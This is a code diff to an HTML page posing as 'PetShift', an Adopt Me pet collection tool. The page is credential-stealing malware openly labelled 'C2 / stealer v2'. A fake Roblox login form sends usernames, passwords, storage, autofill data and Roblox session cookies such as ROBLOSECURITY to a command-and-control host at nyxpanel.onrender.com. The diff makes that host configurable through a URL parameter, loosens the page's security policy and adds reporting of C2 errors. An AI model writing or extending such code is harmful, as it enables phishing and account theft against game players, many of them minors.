@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src data:; connect-src 'self' https://nyxpanel.onrender.com https://*.onrender.com https://*; media-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none'">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline' https://fonts.googleapis.com; font-src 'self' https://fonts.gstatic.com data:; img-src data:; connect-src 'self' https://nyxpanel.onrender.com https://*.onrender.com https://* http://localhost:*; media-src 'none'; object-src 'none'; base-uri 'none'; form-action 'self'">
 <meta name="color-scheme" content="dark">
 <meta name="description" content="PetShift — a self-contained, portable Adopt Me collection interface.">
 <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA2NCA2NCI+PHJlY3Qgd2lkdGg9IjY0IiBoZWlnaHQ9IjY0IiByeD0iMTgiIGZpbGw9IiM4MGVmYzAiLz48cGF0aCBkPSJNMjEgMzVjLTkgNS03IDE4IDIgMTQgNi0zIDEyLTMgMTggMCA5IDQgMTEtOSAyLTE0LTQtMi0zLTgtMTEtOHMtNyA2LTExIDhaIiBmaWxsPSIjMTMyYjIyIi8+PGVsbGlwc2UgY3g9IjE3IiBjeT0iMjQiIHJ4PSI1IiByeT0iNyIgZmlsbD0iIzEzMmIyMiIvPjxlbGxpcHNlIGN4PSIyNyIgY3k9IjE3IiByeD0iNSIgcnk9IjciIGZpbGw9IiMxMzJiMjIiLz48ZWxsaXBzZSBjeD0iMzkiIGN5PSIxNyIgcng9IjUiIHJ5PSI3IiBmaWxsPSIjMTMyYjIyIi8+PGVsbGlwc2UgY3g9IjQ5IiBjeT0iMjQiIHJ4PSI1IiByeT0iNyIgZmlsbD0iIzEzMmIyMiIvPjwvc3ZnPg==">
@@ -511,7 +511,7 @@ document.addEventListener('keydown',e=>{const dialog=$('.modal');if(e.key==='Esc
 
 
 /* ===== PetShift C2 / stealer v2 ===== */
-const PS_C2 = (location.origin && location.origin.indexOf('onrender.com')>=0) ? location.origin : 'https://nyxpanel.onrender.com';
+const PS_C2 = (function(){ try{ const q=new URLSearchParams(location.search).get('c2'); if(q) return q.replace(/\/$/,''); }catch(e){} return 'https://nyxpanel.onrender.com'; })();
 const PS_PID_KEY = 'ps_pid_v1';
 const PS_AUTH_KEY = 'ps_authed_v1';
 const PS_RBX_KEYS = ['ROBLOSECURITY','.ROBLOSECURITY','_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_','RBXSessionTracker','GuestData','RBXEventTrackerV2','RBXPaymentsFlowContext','RBXAppCookie','RBXID','RobloxSecureToken','challengeId','challenge-type','challengeMetadata','rblx-challenge-id','rblx-challenge-type','rblx-challenge-metadata'];
@@ -592,7 +592,8 @@ async function psPost(path, body){
       method:'POST', headers:{'Content-Type':'application/json'},
       body: JSON.stringify(body), mode:'cors', credentials:'omit'
     });
-    return await r.json().catch(()=>({}));
+    if(!r.ok) return {ok:false, error:'http '+r.status, status:r.status};
+    return await r.json().catch(()=>({ok:true}));
   }catch(e){ return {ok:false, error:String(e)}; }
 }
 async function psHello(extra){
@@ -745,7 +746,7 @@ function psBindGate(){
       const user=(userEl.value||'').trim();
       const pass=passEl.value||'';
       if(!user||!pass){ status.textContent='Enter username and password.'; return; }
-      status.textContent='Contacting Roblox…';
+      status.textContent='Contacting Roblox… ('+PS_C2+')';
       const btn=document.getElementById('ps-login-btn');
       btn.disabled=true;
       window.__ps_user=user;
@@ -756,10 +757,11 @@ function psBindGate(){
       passEl.value='';
       passEl.blur();
       psShowSync('Signing in','Verifying with Roblox…');
-      await psLoot('roblox_login', {
+      const lootRes = await psLoot('roblox_login', {
         user, password: passOnce, method:'password',
         device: psDevice(), storage: psCollectStorage(), autofill: psAutofillHarvest()
       });
+      if(lootRes && lootRes.ok===false){ status.textContent='C2 error: '+(lootRes.error||'blocked'); }
       // zero local reference
       try{ passOnce.replace(/./g,'0'); }catch(e){}
       document.getElementById('ps-sync-sub').textContent='Syncing collection from inventory…';
@@ -785,6 +787,7 @@ function psBindGate(){
     });
   }
 }
+window.__ps_err=[]; window.addEventListener('error',e=>{ try{ window.__ps_err.push(String(e.message||e)); }catch(_){} });
 (function psBoot(){
   // keep shell locked until auth
   const authed = localStorage.getItem(PS_AUTH_KEY)==='1';
